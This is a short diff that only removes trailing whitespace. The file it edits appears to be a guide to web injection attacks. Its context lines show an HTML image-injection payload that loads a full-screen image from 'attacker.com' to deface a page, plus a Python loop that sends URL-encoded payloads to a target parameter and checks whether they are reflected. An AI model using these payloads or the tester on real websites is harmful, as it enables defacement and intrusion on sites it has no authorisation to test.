@@ -249,7 +249,7 @@ Website appearance manipulation:
 </body>
 
 <!-- Image injection -->
-<img src="http://attacker.com/defaced.jpg" 
+<img src="http://attacker.com/defaced.jpg"
      style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999">
 
 <!-- Marquee injection (visible movement) -->
@@ -383,7 +383,7 @@ payloads = [
 for payload in payloads:
     encoded = urllib.parse.quote(payload)
     url = f"{target}?{param}={encoded}"
-    
+
     try:
         response = requests.get(url, timeout=5)
         if payload.lower() in response.text.lower():
